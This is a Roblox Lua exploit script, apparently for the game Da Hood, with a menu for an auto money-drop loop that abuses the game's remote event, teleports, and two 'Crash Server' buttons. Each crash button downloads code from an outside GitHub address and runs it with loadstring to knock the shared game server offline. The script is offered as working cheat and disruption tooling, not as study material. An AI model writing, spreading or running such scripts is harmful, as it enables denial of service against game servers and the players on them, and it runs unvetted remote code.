local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()

local colors = {

    SchemeColor = Color3.fromRGB(25,25,25),

    Background = Color3.fromRGB(40, 40, 40),

    Header = Color3.fromRGB(30, 30, 30),

    TextColor = Color3.fromRGB(255,255,255),

    ElementColor = Color3.fromRGB(20, 20, 20)

}

local Window = Library.CreateLib("Turtles selling ui v2" ,colors)

--tabs

local Tab1 = Window:NewTab("Main")

local Section1= Tab1:NewSection("Main")

local Tab2 = Window:NewTab("Toggles")

local Section2 = Tab2:NewSection("Toggles")

local Tab3 = Window:NewTab("Teleports")

local Section3 = Tab3:NewSection("Teleports")

local Tab4 = Window:NewTab("Extra")

local Section4= Tab4:NewSection("Extra")

--functions

Section2:NewToggle("Auto Drop", "ToggleInfo", function(state)

    if state then

        

_G.Cash = true; while

_G.Cash== true do 

game.ReplicatedStorage.MainEvent:FireServer("DropMoney",10000)

game:GetService("Players").LocalPlayer.DataFolder.Currency.Value = game:GetService("Players").LocalPlayer.DataFolder.Currency.Value - 10000

wait(15.7) end

    else

_G.Cash = false; while 

_G.Cash== true do 

game.ReplicatedStorage.MainEvent:FireServer("DropMoney",10000)

game:GetService("Players").LocalPlayer.DataFolder.Currency.Value = game:GetService("Players").LocalPlayer.DataFolder.Currency.Value - 10000

wait(15.7) end

        end

end)

Section3:NewButton("Safe Spot", "ButtonInfo", function() game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(207.48085, 38.25, 200014.953, 0.507315397, 0, -0.861760437, 0, 1, 0, 0.861760437, 0, 0.507315397) end) 

Section3:NewButton("Bank", "ButtonInfo", function() game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-437.125885, 38.9783134, -285.587372, 0.0165725499, 5.298579e-08, -0.99986279, 1.16139711e-08, 1, 5.31855591e-08, 0.99986279, -1.24937944e-08, 0.0165725499) end) 

Section3:NewButton("Admin Base", "ButtonInfo", function() game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-873.131531, -38.3992119, -582.999573, 0.995990932, 8.53862048e-09, -0.0894544795, 1.00775621e-09, 1, 1.06672545e-07, 0.0894544795, -1.06335037e-07, 0.995990932) end)

game:GetService("StarterGui"):SetCore("SendNotification",{ Title = "!!!"; Text = "Tell me if there is any errors"; Duration = 10; }) 

Section3:NewButton("UFO", "ButtonInfo", function()

    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(71.7331619, 139, -691.154419, 0.602706313, 7.78292178e-06, 0.797962964, 7.63640458e-07, 1, -1.03302691e-05, -0.797962964, 6.83547478e-06, 0.602706313) end)

Section3:NewButton("Gas Station", "ButtonInfo", function()

   game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(591.680725, 49.0000458, -256.818298, -0.0874911696, -3.41755495e-08, -0.996165276, 1.23318324e-08, 1, -3.53901868e-08, 0.996165276, -1.53808717e-08, -0.0874911696) end)

Section1:NewTextBox("TP to player", "TextboxInfo", function(txt)

local p1 = game.Players.LocalPlayer.Character.HumanoidRootPart local p2 = txt 

local pos = p1.CFrame p1.CFrame = game.Players[p2].Character.HumanoidRootPart.CFrame wait(5) 

end)

Section1:NewLabel("TP requires full username(sorry)")

Section1:NewButton("Crash Server [PC]", "ButtonInfo", function() loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))() 

end)

Section1:NewLabel("Swagmode Crash")

Section1:NewButton("Crash Server [MOBILE]", "ButtonInfo", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/LPrandom/lua-projects/master/dahoodcrasher.lua"))()

end)

Section1:NewLabel("Encrypt Crash")

Section4:NewKeybind("Toggle UI [X]", "KeybindInfo", Enum.KeyCode.X, function()

	Library:ToggleUI()end)

Section1:NewButton("Reset", "ButtonInfo", function()

    local plr = game.Players.LocalPlayer			game.Players.LocalPlayer.Character.Humanoid.Health = 0

end)

Section1:NewLabel("Normal Reset Not Forced")
